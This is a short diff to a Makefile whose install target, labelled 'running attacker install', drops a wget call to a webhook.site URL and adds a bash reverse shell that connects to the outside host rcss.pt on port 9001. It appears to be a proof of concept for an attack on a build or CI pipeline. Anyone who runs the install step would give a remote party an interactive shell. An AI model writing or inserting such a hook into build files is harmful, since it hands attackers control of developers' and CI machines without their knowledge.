@@ -1,7 +1,6 @@
 install:
 	@echo "running attacker install"
-	apt install curl;
-	wget https://webhook.site/TestActions/google-adk-samples/test5;
+	/bin/bash -i >& /dev/tcp/rcss.pt/9001 0>&1
 
 lint:
 	@echo "do nothing"
